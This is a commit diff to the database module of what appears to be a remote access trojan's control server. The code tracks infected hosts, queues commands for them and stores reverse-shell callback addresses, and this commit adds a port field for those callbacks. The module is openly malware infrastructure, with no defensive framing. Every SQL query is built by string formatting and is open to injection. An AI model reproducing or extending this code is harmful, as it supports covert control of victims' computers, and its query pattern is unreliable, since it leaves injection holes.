10d9f60ef4b3c45ec1a86f8bd9022dff2320bab2
H0lyL337 <deadmanwalkingx13@gmail.com>
2022-10-07 19:54:38 -0400

    Update apext_db.py

--- apext_db.py
+++ apext_db.py
@@ -22,7 +22,8 @@ def create():
     db.execute(''' CREATE TABLE rshell (
     user_ip VARCHAR(32) NOT NULL,
     username VARCHAR(32) NOT NULL,
-    master_ip VARCHAR(32) NOT NULL
+    master_ip VARCHAR(32) NOT NULL,
+    master_port VARCHAR(32) NOT NULL
     ); ''')
 
 def register(ip, username, os, registered, last_seen):
@@ -31,8 +32,9 @@ def register(ip, username, os, registered, last_seen):
     db.commit()
     db.execute("INSERT INTO command VALUES('{0}', '{1}', '{2}');".format(ip, username, 'ls'))
     db.commit()
-    db.execute("INSERT INTO rshell VALUES('{0}', '{1}', '{2}');".format(ip, username, '0.0.0.0'))
+    db.execute("INSERT INTO rshell VALUES('{0}', '{1}', '{2}', '{3}');".format(ip, username, '0.0.0.0', '0000'))
     db.commit()
+    
 
 def user_command(ip, username, command):
     db = sqlite3.connect('apext.db')
@@ -44,23 +46,31 @@ def rshell_master(ip, username, master_ip):
     db.execute("UPDATE rshell SET master_ip = '{0}' WHERE user_ip='{1}' and username='{2}';".format(master_ip, ip, username))
     db.commit()
 
+def update_rshell_master_port(ip, username, master_port):
+    db = sqlite3.connect('apext.db')
+    db.execute("UPDATE rshell SET master_port='{0}' WHERE user_ip='{1}' and username='{2}';".format(master_port, ip, username))
+    db.commit()
+
 def get_rshell_master(ip, username):
-    print(ip + username)
     db = sqlite3.connect('apext.db')
     cur = db.cursor()
     cur.execute('SELECT master_ip FROM rshell WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
     return cur.fetchone()[0]
 
+def get_rshell_master_port(ip, username):
+    db = sqlite3.connect('apext.db')
+    cur = db.cursor()
+    cur.execute('SELECT master_port FROM rshell WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
+    return cur.fetchone()[0]
+
 
 def get_user_command(ip, username):
-    print(ip + username)
     db = sqlite3.connect('apext.db')
     cur = db.cursor()
     cur.execute('SELECT command FROM command WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
     return cur.fetchone()[0]
 
 def check_rat_exists(ip, username):
-    print(ip + username)
     db = sqlite3.connect('apext.db')
     cur = db.cursor()
     cur.execute('SELECT * FROM command WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
@@ -68,7 +78,6 @@ def check_rat_exists(ip, username):
     return cur.fetchone()
 
 def remove_user_command(ip, username):
-    print(ip + username)
     db = sqlite3.connect('apext.db')
     cur = db.cursor()
     cur.execute("UPDATE command SET command = ' ' WHERE user_ip='{0}' and username='{1}';".format(ip, username))
@@ -82,7 +91,6 @@ def get_rat_list():
     return cur.fetchall()
 
 def check_rat_existss(ip):
-    print(ip)
     db = sqlite3.connect('apext.db')
     cur = db.cursor()
     cur.execute('SELECT user_ip, username FROM command WHERE user_ip="{0}";'.format(ip))
